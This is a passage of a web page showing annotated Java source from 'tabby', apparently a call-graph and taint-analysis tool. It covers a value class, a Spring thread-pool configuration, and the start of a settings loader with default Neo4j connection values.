punctuation">(</span>isStatic<span class="token punctuation">)</span><span class="token punctuation">;</span>        newValue<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        newValue<span class="token punctuation">.</span><span class="token function">setTypeName</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>        newValue<span class="token punctuation">.</span><span class="token function">setOrigin</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>        newValue<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span>status<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> newValue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isArrayType</span><span class="token punctuation">(</span><span class="token class-name">Type</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token keyword">instanceof</span> <span class="token class-name">ArrayType</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"java.util.List"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token operator">&amp;&amp;</span> <span class="token string">"java.util.Collection"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getRelatedType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> status<span class="token punctuation">.</span><span class="token function">getFirstPollutedType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRelatedType</span><span class="token punctuation">(</span><span class="token class-name">String</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        status<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPolluted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> status<span class="token punctuation">.</span><span class="token function">isPolluted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPolluted</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> polluted<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        status<span class="token punctuation">.</span><span class="token function">setPolluted</span><span class="token punctuation">(</span>polluted<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> o<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token class-name">TabbyValue</span> that <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TabbyValue</span><span class="token punctuation">)</span> o<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>isArray<span class="token punctuation">,</span> that<span class="token punctuation">.</span>isArray<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>isField<span class="token punctuation">,</span> that<span class="token punctuation">.</span>isField<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>isStatic<span class="token punctuation">,</span> that<span class="token punctuation">.</span>isStatic<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> that<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> that<span class="token punctuation">.</span>typeName<span class="token punctuation">)</span>                <span class="token comment">// .append(status.isPolluted, that.status.isPolluted).isEquals();</span>                <span class="token punctuation">.</span><span class="token function">isEquals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">HashCodeBuilder</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>isArray<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>isField<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>isStatic<span class="token punctuation">)</span>                <span class="token comment">// .append(status.isPolluted).toHashCode();</span>                <span class="token punctuation">.</span><span class="token function">toHashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// TODO 关于污点追踪这块的实现，其实是存在缺陷的</span>        <span class="token comment">// 当前使用的relatedType并不是一个很好的方案</span>        <span class="token comment">// 等当前事情过去，再想个合适的方法</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbyonfigasyncconfiguration.java">tabby/onfig/AsyncConfiguration.java</h3><ol type="1"><li><p>配置 Spring Boot应用程序的线程池。线程池可以用于异步执行任务，以提高应用程序的性能。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>scheduling<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">EnableAsync</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>scheduling<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ThreadPoolTaskExecutor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ThreadPoolExecutor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token static">max</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token static">min</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3P1g * @since 2021/4/23 */</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableAsync</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AsyncConfiguration</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">// 用于创建名为 tabby-collector 的线程池。Executor 是 Spring Boot 用于管理线程池的接口</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span><span class="token string">"tabby-collector"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Executor</span> <span class="token function">master</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 核心线程数是指始终保持活动的线程数量，而最大线程数是指线程池可以创建的最大线程数量。</span>        <span class="token keyword">int</span> corePoolSize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">/</span> <span class="token number">0.8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxPoolSize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">/</span> <span class="token number">0.6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">makeExecutor</span><span class="token punctuation">(</span>corePoolSize<span class="token punctuation">,</span> maxPoolSize<span class="token punctuation">,</span><span class="token string">"tabby-collector"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">Executor</span> <span class="token function">makeExecutor</span><span class="token punctuation">(</span><span class="token keyword">int</span> corePoolSize<span class="token punctuation">,</span> <span class="token keyword">int</span> maxPoolSize<span class="token punctuation">,</span> <span class="token class-name">String</span> prefix<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Open &#123;&#125; size for thread pool &#123;&#125;"</span><span class="token punctuation">,</span> corePoolSize<span class="token punctuation">,</span> prefix<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ThreadPoolTaskExecutor</span> executor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolTaskExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        executor<span class="token punctuation">.</span><span class="token function">setCorePoolSize</span><span class="token punctuation">(</span>corePoolSize<span class="token punctuation">)</span><span class="token punctuation">;</span>        executor<span class="token punctuation">.</span><span class="token function">setMaxPoolSize</span><span class="token punctuation">(</span>maxPoolSize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置线程池的队列容量。</span>        executor<span class="token punctuation">.</span><span class="token function">setQueueCapacity</span><span class="token punctuation">(</span>maxPoolSize <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置线程池的空闲线程存活时间</span>        executor<span class="token punctuation">.</span><span class="token function">setKeepAliveSeconds</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置线程池的线程名称前缀。</span>        executor<span class="token punctuation">.</span><span class="token function">setThreadNamePrefix</span><span class="token punctuation">(</span>prefix<span class="token operator">+</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置线程池的拒绝策略</span>        executor<span class="token punctuation">.</span><span class="token function">setRejectedExecutionHandler</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">.</span>        <span class="token comment">// ThreadPoolExecutor 类的拒绝策略之一。它表示当线程池无法接收新任务时，将由调用线程来执行该任务。</span>        <span class="token class-name">CallerRunsPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        executor<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> executor<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbyconfigglobalconfiguration.java">tabby/config/GlobalConfiguration.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>gson<span class="token punctuation">.</span></span><span class="token class-name">Gson</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container<span class="token punctuation">.</span></span><span class="token class-name">RulesContainer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">FileUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Reader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3P1g * @since 2020/11/9 */</span><span class="token comment">//  1. 如果 `props` 为空，则创建一个新的 `Properties` 对象。</span><span class="token comment">//  2. 读取配置文件 `settings.properties` 并将其内容加载到 `props` 对象中。</span><span class="token comment">//  3. 设置 Neo4j 的用户名、密码和 URL。</span><span class="token comment">//  4. 获取规则文件的路径。</span><span class="token comment">//  5. 设置线程池的核心线程数</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GlobalConfiguration</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">CONFIG_FILE_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"config"</span><span class="token punctuation">,</span> <span class="token string">"settings.properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">LIBS_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"libs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">RULES_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">SINK_RULE_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">SYSTEM_RULE_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">IGNORE_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">BASIC_CLASSES_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">COMMON_JARS_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">CLASSES_OUTPUT_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">METHODS_OUTPUT_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">CALL_RELATIONSHIP_OUTPUT_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">ALIAS_RELATIONSHIP_OUTPUT_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">EXTEND_RELATIONSHIP_OUTPUT_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">HAS_RELATIONSHIP_OUTPUT_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">INTERFACE_RELATIONSHIP_OUTPUT_PATH</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_DOCKER_IMPORT_PATH</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Gson</span> <span class="token constant">GSON</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">DEBUG</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token constant">TIMEOUT</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">MODE</span> <span class="token operator">=</span> <span class="token string">"gadget"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">TARGET</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">OUTPUT_DIRECTORY</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">NEO4J_USERNAME</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">NEO4J_PASSWORD</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">NEO4J_URL</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">RulesContainer</span> rulesContainer<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> libraries <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_WEB_MODE</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_JDK_ONLY</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_JDK_PROCESS</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_BUILD_ENABLE</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_LOAD_ENABLE</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_EXCLUDE_JDK</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_WITH_ALL_JDK</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_CHECK_FAT_JAR</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_FULL_CALL_GRAPH_CONSTRUCT</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token constant">IS_NEED_TO_CREATE_IGNORE_LIST</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Properties</span> props<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> isInitialed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> isNeedStop <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">THREAD_POOL_SIZE</span> <span class="token operator">=</span> <span class="token string">"max"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>props <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// read from config/settings.properties</span>            <span class="token keyword">try</span><span class="token punctuation">(</span><span class="token class-name">Reader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token constant">CONFIG_FILE_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                props<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>reader<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Config ERROR: settings.properties file not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// db settings</span>            <span class="token constant">NEO4J_USERNAME</span> <span class="token operator">=</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.neo4j.username"</span><span class="token punctuation">,</span> <span class="token string">"neo4j"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">NEO4J_PASSWORD</span> <span class="token operator">=</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.neo4j.password"</span><span class="token punctuation">,</span> <span class="token string">"neo4j"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">NEO4J_URL</span> <span class="token operator">=</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.neo4j.url"</span><span class="token punctuation">,</span> <span class="token string">"bolt://localhost:7687"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// resolve rule directory</span>            <span class="token constant">RULES_PATH</span> <span class="token operator">=</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.rules.directory"</span><span class="token punctuation">,</span> <span class="token string">"./rules"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">RULES_PATH</span> <span class="token operator">=</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token constant">RULES_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">SINK_RULE_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span 